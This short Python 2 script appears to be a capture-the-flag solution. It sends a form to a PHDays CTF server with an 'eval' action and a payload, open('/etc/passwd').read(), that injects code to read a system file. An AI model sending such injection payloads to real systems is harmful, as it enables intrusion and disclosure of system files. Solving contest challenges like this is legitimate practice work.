import sys
import urllib2
import urllib

url_ = "http://127.0.0.1"
url_ = "http://ctf.phdays.com:2137/"

def send(choice, actions, human):
    form = ""
    form += "human=" + human + "&"
    for a in actions:
        form += "actions=" + a + "&"
    form += "choice=" + choice

    resp = urllib2.urlopen(url = url_, data = form)
    content = resp.read()
    print content

if __name__ == "__main__":
    choice = "%01"
    actions = ["kill", "eval", "bankrupt"]
    human = "open('/etc/passwd').read()"
    send(choice, actions, human)
    
       
        
